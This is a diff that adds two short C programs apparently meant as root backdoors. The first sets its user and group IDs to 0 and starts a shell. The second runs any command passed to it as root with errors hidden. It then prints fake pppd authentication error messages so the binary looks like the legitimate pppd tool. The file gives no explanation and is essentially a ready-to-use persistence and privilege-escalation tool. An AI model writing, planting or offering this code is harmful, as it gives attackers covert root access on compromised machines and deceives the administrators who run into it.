@@ -1,0 +1,28 @@
+(ex 1) 
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdlib.h>
+int main(void)
+{
+  setuid(0);
+  setgid(0);
+  system("/bin/sh");
+}
+
+(ex 2) 
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdlib.h>
+int main(int argc, char *argv[ ])
+{
+  char exec[100];
+  setuid(0);
+  setgid(0);
+  sprintf(exec, "%s 2>/dev/null", argv[1]);
+  system(exec);
+
+printf("./pppd: The remote system is required to authenticate itself\n");
+printf("./pppd: but I couldn't find any suitable secret (password) for it to use to do so.\n");
+}
